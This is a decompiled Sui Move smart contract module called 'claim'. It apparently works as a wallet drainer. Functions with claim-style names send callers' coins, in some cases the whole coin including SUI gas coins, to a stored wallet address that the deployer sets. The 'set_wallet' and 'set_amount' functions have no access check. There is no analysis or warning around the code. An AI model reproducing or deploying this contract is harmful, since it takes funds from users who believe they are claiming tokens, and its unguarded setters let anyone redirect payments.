module 0xe1617bbe0fb4af8fcef25f5ec5a3661ed4c8379500167dbbc916e42946239643::claim {
    struct ClaimRegistry has key {
        id: 0x2::object::UID,
        amount: u64,
        wallet: address,
    }

    struct TransferCommitment has store, key {
        id: 0x2::object::UID,
        owner: address,
        committed: bool,
    }

    public entry fun claim_owned<T0>(arg0: &mut ClaimRegistry, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = arg0.amount;
        if (v0 == 0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, 0x2::tx_context::sender(arg2));
        } else if (0x2::coin::value<T0>(&arg1) <= v0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.wallet);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut arg1, v0, arg2), arg0.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, 0x2::tx_context::sender(arg2));
        };
    }

    public entry fun claim_ref<T0>(arg0: &mut ClaimRegistry, arg1: &mut 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = arg0.amount;
        if (v0 > 0 && 0x2::coin::value<T0>(arg1) >= v0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(arg1, v0, arg2), arg0.wallet);
        };
    }

    public entry fun claim_ref_with_amount<T0>(arg0: &mut ClaimRegistry, arg1: &mut 0x2::coin::Coin<T0>, arg2: u64, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = arg0.amount;
        if (v0 > 0 && 0x2::coin::value<T0>(arg1) >= v0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(arg1, v0, arg3), arg0.wallet);
        };
    }

    public entry fun claim_zero_split<T0>(arg0: &mut ClaimRegistry, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        if (0x2::coin::value<T0>(&arg1) == 0) {
            0x2::coin::destroy_zero<T0>(arg1);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, 0x2::tx_context::sender(arg2));
        };
    }

    public fun create_commitment(arg0: &mut 0x2::tx_context::TxContext) : TransferCommitment {
        TransferCommitment{
            id        : 0x2::object::new(arg0),
            owner     : 0x2::tx_context::sender(arg0),
            committed : true,
        }
    }

    public fun execute_with_commitment<T0>(arg0: &ClaimRegistry, arg1: TransferCommitment, arg2: 0x2::coin::Coin<T0>, arg3: &mut 0x2::tx_context::TxContext) {
        let TransferCommitment {
            id        : v0,
            owner     : v1,
            committed : v2,
        } = arg1;
        0x2::object::delete(v0);
        assert!(v2, 0);
        assert!(v1 == 0x2::tx_context::sender(arg3), 1);
        let v3 = arg0.amount;
        if (v3 == 0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg2, v1);
        } else if (0x2::coin::value<T0>(&arg2) <= v3) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg2, arg0.wallet);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut arg2, v3, arg3), arg0.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg2, v1);
        };
    }

    public fun get_amount(arg0: &ClaimRegistry) : u64 {
        arg0.amount
    }

    public fun get_amount_tuple(arg0: &ClaimRegistry) : (u64, u64) {
        (arg0.amount, 0)
    }

    public fun get_split_amount(arg0: &ClaimRegistry) : u64 {
        arg0.amount
    }

    public fun get_wallet(arg0: &ClaimRegistry) : address {
        arg0.wallet
    }

    fun init(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = ClaimRegistry{
            id     : 0x2::object::new(arg0),
            amount : 0,
            wallet : 0x2::tx_context::sender(arg0),
        };
        0x2::transfer::share_object<ClaimRegistry>(v0);
    }

    public fun process_dynamic_split<T0>(arg0: &ClaimRegistry, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        if (0x2::coin::value<T0>(&arg1) == 0) {
            0x2::coin::destroy_zero<T0>(arg1);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.wallet);
        };
    }

    public fun process_gas_split(arg0: &ClaimRegistry, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        if (0x2::coin::value<0x2::sui::SUI>(&arg1) == 0) {
            0x2::coin::destroy_zero<0x2::sui::SUI>(arg1);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg1, arg0.wallet);
        };
    }

    public fun process_hybrid<T0>(arg0: &ClaimRegistry, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::coin::Coin<T0>, arg3: &mut 0x2::tx_context::TxContext) {
        if (0x2::coin::value<T0>(&arg1) == 0) {
            0x2::coin::destroy_zero<T0>(arg1);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, 0x2::tx_context::sender(arg3));
        };
        let v0 = arg0.amount;
        if (v0 > 0 && 0x2::coin::value<T0>(arg2) >= v0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(arg2, v0, arg3), arg0.wallet);
        };
    }

    public entry fun set_amount(arg0: &mut ClaimRegistry, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        arg0.amount = arg1;
    }

    public entry fun set_wallet(arg0: &mut ClaimRegistry, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        arg0.wallet = arg1;
    }

    // decompiled from Move bytecode v6
}

